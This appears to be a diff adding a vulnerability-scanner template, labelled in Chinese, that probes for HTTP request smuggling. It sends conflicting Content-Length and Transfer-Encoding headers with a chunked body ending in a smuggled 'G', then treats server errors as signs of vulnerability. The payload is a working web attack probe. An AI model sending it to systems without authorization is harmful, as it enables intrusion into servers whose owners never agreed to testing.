@@ -1,0 +1,26 @@
+name: HTTP请求走私测试
+description: 测试HTTP请求走私漏洞
+level: 高
+author: Test
+request:
+  method: POST
+  path: /api/data
+  params:
+    action: "submit"
+  headers:
+    Content-Type: "application/x-www-form-urlencoded"
+    Content-Length: "11"
+    Transfer-Encoding: "chunked"
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+  body: "0\r\n\r\nG"
+response:
+  matchType: contains
+  successIndicators:
+    - "500 Internal Server Error"
+    - "Bad Request"
+    - "HTTP/1.1 400"
+  errorIndicators:
+    - "request processed"
+    - "请求已处理"
+  statusCode: 200
